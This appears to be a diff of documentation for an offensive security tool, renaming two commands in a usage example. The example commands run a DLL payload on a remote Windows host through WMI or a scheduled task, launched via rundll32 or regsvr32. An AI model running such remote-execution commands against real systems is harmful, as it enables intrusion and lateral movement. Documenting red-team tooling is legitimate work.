@@ -53,11 +53,11 @@ corresponding 32-bit binaries are under `SysWOW64`. Use
 `--launcher-program` when the built-in program does not match the DLL.
 
 ```text
-rex WMIExec --target 10.0.0.15 --payload-type dll \
+rex wmi-exec --target 10.0.0.15 --payload-type dll \
   --remote-path C:\ProgramData\payload.dll \
   --launcher rundll32.exe --entry-point Run
 
-rex TaskSchedExec --target 10.0.0.15 --task-name TemporaryTask \
+rex task-sched-exec --target 10.0.0.15 --task-name TemporaryTask \
   --payload-type dll --remote-path C:\ProgramData\payload.dll \
   --launcher "regsvr32.exe (/i)"
 ```
